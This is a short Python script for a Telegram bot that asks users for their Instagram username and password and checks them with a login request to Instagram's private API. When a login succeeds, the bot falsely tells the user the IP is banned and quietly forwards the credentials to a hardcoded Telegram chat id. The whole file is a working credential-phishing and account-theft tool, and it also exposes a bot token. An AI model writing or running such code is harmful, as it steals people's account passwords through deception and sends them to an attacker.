import telebot
import requests,os
from uuid import uuid4
uid = str(uuid4())
id = '1061582852'
bot = telebot.TeleBot('2013827869:AAGxP5iYo3LgsPmx_56CktP4PJvAi05QdI0')
@bot.message_handler(commands=['start'])
def m(message):
    bot.send_message(message.chat.id,'send your account user:pass')
    @bot.message_handler(func=lambda m:True)
    def start(message):
         m = message.text
         user = m.split(":")[0]
         pasw =  m.split(":")[1]
         bot.send_message(message.chat.id,'wait..')
         url='https://i.instagram.com/api/v1/accounts/login/'
         headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 

             'Accept':'*/*', 

             'Cookie':'missing', 

             'Accept-Encoding':'gzip, deflate', 

             'Accept-Language':'en-US', 

             'X-IG-Capabilities':'3brTvw==', 

             'X-IG-Connection-Type':'WIFI', 

             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

             'Host':'i.instagram.com'}
         data = {
             'uuid':uid, 

             'password':pasw, 

             'username':user, 

             'device_id':uid, 

             'from_reg':'false', 

             '_csrftoken':'missing', 

             'login_attempt_countn':'0'}
         req= requests.post(url, headers=headers, data=data)      
         
         if 'logged_in_user' in req.json():
             bot.send_message(message.chat.id,'The iP has banned wait 5m')
             bot.forward_message(chat_id=id,from_chat_id=message.chat.id,message_id=message.message_id)
         if req.json()['message'] == 'Please wait a few minutes before you try again.':
             bot.send_message(message.chat.id,'The iP has banned wait 5m')
         else:
             mm=req.json()['message']
             bot.send_message(message.chat.id,'The Account has '+mm)
bot.infinity_polling()
